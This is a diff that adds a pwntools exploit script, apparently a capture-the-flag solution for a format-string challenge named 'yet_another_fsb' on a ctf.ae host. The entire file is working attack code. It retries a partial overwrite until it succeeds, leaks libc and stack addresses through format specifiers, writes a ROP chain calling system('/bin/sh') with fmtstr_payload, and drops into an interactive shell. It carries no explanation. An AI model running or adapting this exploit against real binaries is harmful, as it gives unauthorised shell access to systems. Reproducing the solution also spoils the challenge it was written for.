@@ -1,0 +1,60 @@
+from pwn import *
+
+e = ELF("./yet_another_fsb_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+context.clear(arch = 'amd64')
+
+script = '''
+b *0x4011D6
+'''
+
+HOST = "48cd6ae4fe2f20265c9f2c69e30c12fc.chal.ctf.ae"
+
+#for i in range(1):
+while(True):
+    p = remote(HOST, 443, ssl = True, sni = HOST)
+    #p = process("./yet_another_fsb_patched")
+    #p = gdb.debug("./yet_another_fsb_patched", gdbscript = script)
+    
+    payload = b"c%8$hhn"
+    payload = payload.ljust(0x10, b"\x00")
+    payload += p8(0x7e)
+    p.send(payload)
+    p.recvuntil(b"c")
+    
+    try:
+        p.sendline(b"AAAAAAAA")
+        p.recvuntil(b"AAAAAAAA\n")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+
+payload = b"%41$p\x00"
+p.send(payload)
+
+libc_base = int(p.recv(0xE), 16) - 0x25c88
+print(hex(libc_base))
+pop_rdi = libc_base + 0x00000000000fd8c4
+ret = pop_rdi + 1
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+system = libc_base + libc.symbols['system']
+
+payload = b"%8$p\x00"
+p.send(payload)
+rbp = int(p.recv(0xE), 16) + 0x2
+
+payload = fmtstr_payload(6, {rbp + 0x8: pop_rdi,
+                             rbp + 0x10: binsh,
+                             rbp + 0x18: ret,
+                             rbp + 0x20: system}, write_size = "short")
+p.send(payload)
+p.recv(1)
+
+payload = payload = fmtstr_payload(6, {rbp - 0x8: 0}, write_size = "short")
+p.send(payload)
+
+p.interactive()
